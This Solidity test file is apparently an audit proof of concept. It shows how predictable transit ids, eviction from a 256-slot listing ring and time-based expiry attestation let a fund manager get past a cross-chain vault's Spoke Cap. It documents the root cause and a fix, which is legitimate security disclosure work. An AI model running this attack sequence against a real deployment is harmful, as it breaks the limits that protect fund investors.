// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {TransitState, TransferKind} from "../../../src/interfaces/FundTypes.sol";
import {CrossChainFixture} from "./helpers/CrossChainFixture.sol";

/// @title PoC: pre-listing a future transit id keeps its arrival unconfirmed for good and releases the Spoke Cap
/// @notice Finding (medium). Lens: cross-chain messaging and bridging.
///
/// Root cause, three facts together:
/// - hub transit ids are predictable (`keccak256(abi.encode(chainid, coreVault, ++transitNonce))`,
///   `CoreVaultLogic.sendToSpoke`);
/// - the Spoke Vault lists an arrival id in its 256-slot ring only once, when the id's credited total first reaches
///   `MIN_LISTED_ARRIVAL` (`SpokeVault.handleV3AcrossMessage`), and anyone can reach that callback through Across with
///   any id (OQ-01);
/// - once a transit's expiry is attested through the `fillDeadline + maxReportAge` path, its amount leaves
///   `inFlightSent`, and because the hub never confirmed it the spoke's `cumulativeReceived` above `confirmedArrived`
///   is deducted from `spokeValue` as unknown-origin value (`CoreVaultLogic._spokePrincipal`).
///
/// Attack (the manager, or anyone helping, for 1 USDG per future send plus 256 USDG once):
/// 1. Before the send, fill the spoke vault through Across with 1 USDG carrying the NEXT hub transit id (and the one
///    after), then 256 dust fills with throwaway ids: the real ids were listed early and are now evicted from the ring.
///    Unlike the documented dust flush (OQ-09), there is no race against the next report: the eviction is done before
///    the transit even exists.
/// 2. `CoreVault.sendToSpoke(cap)`. The fill credits the spoke, but the id is never listed again, so no report ever
///    confirms it. The send holds the Spoke Cap for `fillDeadline + maxReportAge` only.
/// 3. Anyone calls `CoreVault.attestExpiry(id)`: `inFlightSent` is released. `spokeCapUsage` now reports the spoke as
///    empty although the capital is there.
/// 4. `CoreVault.sendToSpoke(cap)` again, and again.
///
/// Impact: the Spoke Cap, the Mandate's limit on how much principal the manager may hold on a Spoke Chain (DEC-031,
/// DEC-037, DEC-095), is not enforced: here 299,850 USDG sit on Robinhood against a 100,000 USDC cap while
/// `spokeCapUsage` reports 99,950. Share Assets stay consistent (the unconfirmed transits stay in In-flight Value and
/// the same amount is deducted as unknown value), so there is no direct loss; the transits stay `ExpiryAttested` and in
/// In-flight Value forever.
///
/// Fix: do not let the spoke's id listing depend on a first-come ring entry. List an id again whenever its credited
/// total grows (or key the ring by the last credit), make hub transit ids unpredictable to the spoke side (for
/// instance include the escrow address or `blockhash` entropy), and do not release `inFlightSent` on the time path
/// while the spoke's `cumulativeReceived` above `confirmedArrived` covers the transit's `amountToArrive`.
contract SpokeCapBypassPoC is CrossChainFixture {
    uint256 internal constant CAP = 100_000e6;

    function test_POC_preListedTransitReleasesSpokeCap() public {
        assertEq(_spokeCap(), CAP);
        _deposit(alice, 400_000e6);
        uint256 assetsBefore = core.shareAssets();

        // 1. Pre-list the ids of the next two hub sends with 1 USDG each, then flush the ring with 256 dust arrivals.
        bytes32 first = _hubTransitId(1);
        bytes32 second = _hubTransitId(2);
        _strangerFillOnSpoke(attacker, first, 1e6, TransferKind.Principal);
        _strangerFillOnSpoke(attacker, second, 1e6, TransferKind.Principal);
        for (uint256 i; i < 256; ++i) {
            _strangerFillOnSpoke(attacker, keccak256(abi.encode("dust", i)), 1e6, TransferKind.Principal);
        }

        // 2. and 3. Two sends of the whole cap that the hub can never confirm; each releases the cap at its expiry.
        _sendUnconfirmable(first);
        _sendUnconfirmable(second);

        // 4. A third send of the whole cap goes through as well; this one confirms normally.
        (bytes32 third, uint256 thirdDeposit) = _sendToSpoke(CAP, 99_950e6);
        assertEq(third, _hubTransitId(3));
        _fillOnSpoke(thirdDeposit);
        _reportAndDeliver(900);
        assertEq(uint8(core.transit(third).state), uint8(TransitState.ArrivalConfirmed));

        // The spoke holds three times the cap of the fund's principal (plus the 258 USDG of dust)...
        vm.chainId(SPOKE);
        assertEq(spoke.unallocatedBalance(address(usdg)), 3 * 99_950e6 + 258e6);
        vm.chainId(HUB);
        assertGt(3 * 99_950e6, 2 * CAP, "299,850 USDG of fund principal on a spoke capped at 100,000");

        // ...while the hub reports a usage within the cap and would let the manager keep sending after the next expiry.
        (uint256 spokeValue, uint256 inFlightSent, uint256 inFlightToHub, uint256 cap) = core.spokeCapUsage(0);
        assertEq(cap, CAP);
        assertEq(spokeValue, 99_950e6, "only the confirmed send counts");
        assertEq(inFlightSent, 0);
        assertEq(inFlightToHub, 0);

        // No direct loss: the two unconfirmed transits stay in In-flight Value and the same amount is deducted as
        // unknown-origin value, so Share Assets only lost the three bridge fees.
        assertEq(core.inFlightValue(), 2 * 99_950e6, "stuck in In-flight Value for good");
        assertEq(core.shareAssets(), assetsBefore - 3 * 50e6);
    }

    /// @dev One send of the whole cap whose arrival no report lists; after `fillDeadline + maxReportAge` anyone
    ///      attests its expiry and the Spoke Cap is free again.
    function _sendUnconfirmable(bytes32 expectedId) internal {
        (bytes32 id, uint256 depositId) = _sendToSpoke(CAP, 99_950e6);
        assertEq(id, expectedId, "the transit id was predictable");
        _fillOnSpoke(depositId);

        // The arrival is credited on the spoke, but its id was listed (and evicted) before the send existed.
        _reportAndDeliver(900);
        assertEq(uint8(core.transit(id).state), uint8(TransitState.Sent), "never confirmed");

        // While the transit is Sent the cap holds.
        vm.prank(manager);
        vm.expectPartialRevert(ICoreVault.SpokeCapExceeded.selector);
        core.sendToSpoke(0, 1e6, 0, _quote(1e6));

        // Past the fill deadline plus the report lifetime anyone attests the expiry of a transit that did arrive.
        vm.warp(uint256(core.transit(id).fillDeadline) + MAX_REPORT_AGE + 1);
        _reportAndDeliver(900);
        core.attestExpiry(id);
        assertEq(uint8(core.transit(id).state), uint8(TransitState.ExpiryAttested));
    }

    function _hubTransitId(uint256 nonce) internal view returns (bytes32) {
        return keccak256(abi.encode(HUB, address(core), nonce));
    }
}
